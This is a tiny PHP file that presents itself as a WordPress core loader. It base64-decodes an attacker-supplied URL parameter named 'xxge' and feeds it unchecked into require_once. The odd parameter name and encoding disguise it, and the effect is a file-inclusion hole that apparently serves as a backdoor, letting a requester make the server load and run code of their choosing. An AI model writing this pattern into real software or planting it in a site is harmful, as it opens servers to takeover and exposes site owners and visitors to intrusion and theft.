<?php 

	// Load WordPress Core Files
 	$absurl = base64_decode(strip_tags($_GET['xxge']));

	if ( !isset($wp_did_header) ) {
		$wp_did_header = true;
		require_once( $absurl . 'wp-load.php' );
		wp();
	}

 ?>